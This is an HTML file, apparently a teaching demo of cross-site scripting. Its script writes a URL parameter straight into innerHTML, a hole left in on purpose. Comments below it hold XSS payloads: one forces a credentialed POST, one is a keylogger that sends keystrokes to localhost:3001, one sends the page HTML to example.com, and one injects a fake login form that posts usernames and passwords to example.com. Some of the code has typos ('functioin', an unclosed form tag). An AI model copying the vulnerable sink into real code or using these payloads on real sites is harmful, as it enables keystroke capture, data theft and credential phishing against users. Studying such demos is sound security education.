<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example</title>
  </head>
  <body>
    <!-- Vulnerable Code -->
    <div>
      Welcome, <span id="username"></span>! TimeZone,
      <span id="timezone"></span>!
    </div>

    <script>
      // Function to set a cookie, mostly this will be set from server
      function setCookie(name, value, days) {
        const date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        const expires = "expires=" + date.toUTCString();
        document.cookie = name + "=" + value + ";" + expires + ";path=/";
      }

      // Example: Set a cookie named "exampleCookie" with value "Hello, Cookie!" that expires in 7 days
      setCookie("exampleCookie", "Hello, Cookie!", 7);
    </script>

    <!-- Vulnerable Code -->
    <script>
      const params = new URLSearchParams(window.location.search);
      const name = params.get("name");
      document.getElementById("username").innerHTML = name;
    </script>

    <script>
      function createPost(title, description) {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", '/post', true);
        console.log(document.cookie);
        xhr.withCredentials = true;
        xhr.setRequestHeader(
          "Content-type",
          "application/x-www-form-urlencoded"
        );
        xhr.send(`txtName=${title}&mtxMessage=${description}`);
      }
    </script>
  </body>
</html>


<!-- 
    Unauthorized activities
        ?name=<img src="error.gif" onError="createPost('HACK_TITLE', 'HACK_DESCRIPTION');"/>
 -->

 <!-- 
    Capturing keyStrokes - moniter what i am typing and filling and all this is being captured
    <img src="does-not-exist" onError="
    var timeout;
    var buffer = "";
    document.querySelector('body').addEventListener('keypress', function(event){
        if(event.which !== 0){
            clearTimeout(timeout);
            buffer += String.fromCharCode(event.which);
            timeout = setTimeout(functioin(){
                var xhr = new XMLHttpRequest();
                var uri = "http://localhost:3001/keys?data=" + encodeURIComponent(buffer);
                xhr.open('GET', uri);
                xhr.send();
                buffer="";
            }, 400)
        }
    });"/>

    encodeURIComponent(`we have to pass here above line this will give us encodedURI and we have to use it inside url name="..."`);
    -> if i am able to inject this code into my query param in the name 
       i can do many crazy stuff.
  -->


<!-- 
    Steal Critical Information - grab the HTML content of the page
    <img src=\"empty.gif" onError=\"var mycookie=document.cookie; new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`; \"/>
    -> i am sending my entire html document to this url
 -->


<!-- 
    Phishing Attack -
    <h3>Please login to process</h3>
    <form action=http://example.com/fakepage.php
    Username: <br><input type="usename" name="usename"> </br>
    Password: <input type="password" name="password"> </br> <br>
    <input type="submit" value="Login"></br>


-->